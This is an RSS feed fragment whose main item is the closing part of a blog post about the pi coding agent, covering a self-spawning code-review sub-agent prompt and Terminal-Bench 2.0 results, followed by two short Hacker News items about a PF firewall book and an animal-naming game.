<p>Because despite popular belief, models are still poor at finding all the context needed for implementing a new feature or fixing a bug. I attribute this to models being trained to only read parts of files rather than full files, so they're hesitant to read everything. Which means they miss important context and can't see what they need to properly complete the task.</p>
<p>Just look at the <a href="https://github.com/badlogic/pi-mono/issues">pi-mono issue tracker</a> and the pull requests. Many get closed or revised because the agents couldn't fully grasp what's needed. That's not the fault of the contributors, which I truly appreciate because even incomplete PRs help me move faster. It just means we trust our agents too much.</p>
<p>I'm not dismissing sub-agents entirely. There are valid use cases. My most common one is code review: I tell pi to spawn itself with a code review prompt (via a custom slash command) and it gets the outputs.</p>
<pre><code>---
<span>description: Run a code review sub-agent
---</span>
Spawn yourself as a sub-agent via bash to do a code review: $@

Use <span>`pi --print`</span> with appropriate arguments. If the user specifies a model,
use <span>`--provider`</span> and <span>`--model`</span> accordingly.

Pass a prompt to the sub-agent asking it to review the code for:
<span>-</span> Bugs and logic errors
<span>-</span> Security issues
<span>-</span> Error handling gaps

Do not read the code yourself. Let the sub-agent do that.

Report the sub-agent's findings.
</code></pre><p>And here's how I use this to review a pull request on GitHub:</p>
<video src="https://mariozechner.at/posts/2025-11-30-pi-coding-agent/media/subagent.mp4" controls="" loading="lazy">
</video>

<p>With a simple prompt, I can select what specific thing I want to review and what model to use. I could even set thinking levels if I wanted to. I can also save out the full review session to a file and hop into that in another pi session if I wanted. Or I can say this is an ephemeral session and it shouldn't be saved to disk. All of that gets translated into a prompt that the main agent reads and based on which it executes itself again via bash. And while I don't get full observability into the inner workings of the sub-agent, I get full observability on its output. Something other harnesses don't really provide, which makes no sense to me.</p>
<p>Of course, this is a bit of a simulated use case. In reality, I would just spawn a new pi session and ask it to review the pull request, possibly pull it into a branch locally. After I see its initial review, I give my own review and then we work on it together until it's good. That's the workflow I use to not merge garbage code.</p>
<p>Spawning multiple sub-agents to implement various features in parallel is an anti-pattern in my book and doesn't work, unless you don't care if your codebase devolves into a pile of garbage.</p>
<h2 id="toc_19">Benchmarks</h2>
<p>I make a lot of grandiose claims, but do I have numerical proof that all the contrarian things I say above actually work? I have my lived experience, but that's hard to transport in a blog post and you'd just have to believe me. So I created a <a href="https://github.com/laude-institute/terminal-bench">Terminal-Bench 2.0</a> test run for pi with Claude Opus 4.5 and let it compete against Codex, Cursor, Windsurf, and other coding harnesses with their respective native models. Obviously, we all know benchmarks aren't representative of real-world performance, but it's the best I can provide you as a sort of proof that not everything I say is complete bullshit.</p>
<p>I performed a complete run with five trials per task, which makes the results eligible for submission to the leaderboard. I also started a second run that only runs during CET because I found that error rates (and consequently benchmark results) get worse once PST goes online. Here are the results for the first run:</p>
<img src="https://mariozechner.at/posts/2025-11-30-pi-coding-agent/media/terminal-bench.png" loading="lazy">

<p>And here's pi's placement on the current leaderboard as of December 2nd, 2025:</p>
<img src="https://mariozechner.at/posts/2025-11-30-pi-coding-agent/media/results.jpeg" loading="lazy">

<p>And here's the <a href="https://gist.github.com/badlogic/f45e8f6e481e5ab7d3a50659da84edaa">results.json</a> file I've submitted to the Terminal-Bench folks for inclusion in the leaderboard. The bench runner for pi can be found in <a href="https://github.com/badlogic/pi-terminal-bench">this repository</a> if you want to reproduce the results. I suggest you use your Claude plan instead of pay-as-you-go.</p>
<p>Finally, here's a little glimpse into the CET-only run:</p>
<img src="https://mariozechner.at/posts/2025-11-30-pi-coding-agent/media/results2.png" loading="lazy">

<p>This is going to take another day or so to complete. I will update this blog post once that is done.</p>
<p>Also note the ranking of <a href="https://github.com/laude-institute/terminal-bench/tree/main/terminal_bench/agents/terminus_2">Terminus 2</a> on the leaderboard. Terminus 2 is the Terminal-Bench team's own minimal agent that just gives the model a tmux session. The model sends commands as text to tmux and parses the terminal output itself. No fancy tools, no file operations, just raw terminal interaction. And it's holding its own against agents with far more sophisticated tooling and works with a diverse set of models. More evidence that a minimal approach can do just as well.</p>
<h2 id="toc_20">In summary</h2>
<p>Benchmark results are hilarious, but the real proof is in the pudding. And my pudding is my day-to-day work, where pi has been performing admirably. Twitter is full of context engineering posts and blogs, but I feel like none of the harnesses we currently have actually let you do context engineering. pi is my attempt to build myself a tool where I'm in control as much as possible.</p>
<p>I'm pretty happy with where pi is. There are a few more features I'd like to add, like <a href="https://github.com/badlogic/pi-mono/issues/92">compaction</a> or <a href="https://github.com/badlogic/pi-mono/issues/44">tool result streaming</a>, but I don't think there's much more I'll personally need. Missing compaction hasn't been a problem for me personally. For some reason, I'm able to cram <a href="https://mariozechner.at/posts/2025-11-30-pi-coding-agent/media/long-session.html">hundreds of exchanges</a> between me and the agent into a single session, which I couldn't do with Claude Code without compaction.</p>
<p>That said, I welcome contributions. But as with all my open source projects, I tend to be dictatorial. A lesson I've learned the hard way over the years with my bigger projects. If I close an issue or PR you've sent in, I hope there are no hard feelings. I will also do my best to give you reasons why. I just want to keep this focused and maintainable. If pi doesn't fit your needs, I implore you to fork it. I truly mean it. And if you create something that even better fits my needs, I'll happily join your efforts.</p>
<p>I think some of the learnings above transfer to other harnesses as well. Let me know how that goes for you.</p>
<p>
    This page respects your privacy by not using cookies or similar technologies and by not collecting any personally identifiable information.
</p>

</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Book of PF, 4th edition (196 pts)]]></title>
            <link>https://nostarch.com/book-of-pf-4th-edition</link>
            <guid>46844350</guid>
            <pubDate>Sun, 01 Feb 2026 07:50:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://nostarch.com/book-of-pf-4th-edition">https://nostarch.com/book-of-pf-4th-edition</a>, See on <a href="https://news.ycombinator.com/item?id=46844350">Hacker News</a></p>
Couldn't get https://nostarch.com/book-of-pf-4th-edition: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[List animals until failure (321 pts)]]></title>
            <link>https://rose.systems/animalist/</link>
            <guid>46842603</guid>
            <pubDate>Sun, 01 Feb 2026 01:03:23 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://rose.systems/animalist/">https://rose.systems/animalist/</a>, See on <a href="https://news.ycombinator.com/item?id=46842603">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="rules">
        <summary>List as many animals as you can.</summary>
        <p><b>Animals must have Wikipedia articles.</b>
        </p><p><b>You have limited time, but get more time for each animal listed.</b> When the timer runs out, that's game over.
        </p><p><b>No overlapping terms.</b>
           For example, if you list “bear” and “polar bear”, you get no point (or time bonus) for the latter.
           But you can still get a point for a second kind of bear. Order doesn't matter.
        </p><p id="visualshint"><b>Ignore the extraneous visuals.</b>
           Focus on naming animals.
    </p></div></div>]]></description>
        </item>
    </channel>
</rss>